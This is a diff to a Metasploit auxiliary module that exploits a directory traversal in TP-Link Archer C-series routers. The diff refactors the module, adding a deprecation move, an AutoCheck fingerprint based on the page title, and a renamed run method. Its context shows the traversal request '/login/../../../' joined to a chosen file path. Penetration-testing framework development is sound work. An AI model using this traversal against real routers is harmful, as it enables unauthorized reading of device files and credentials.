@@ -4,8 +4,11 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Deprecated
+  moved_from 'auxiliary/scanner/http/archer_c7_traversal'
+
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::Scanner
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -40,7 +43,22 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def run_host(_ip)
+  def check
+    res = send_request_raw({
+      'method' => 'GET',
+      'uri' => '/'
+    })
+    return Exploit::CheckCode::Unknown unless res
+
+    device_title = res.get_html_document&.at('//title')&.text
+    if device_title =~ /Archer C\d/
+      return Exploit::CheckCode::Appears("Target device '#{device_title}'")
+    end
+
+    Exploit::CheckCode::Safe('Target does not appear to be an Archer Cx router.')
+  end
+
+  def run
     uri = normalize_uri('/login/../../../', datastore['FILE'])
     print_status("Grabbing data at #{uri}")
     res = send_request_raw({
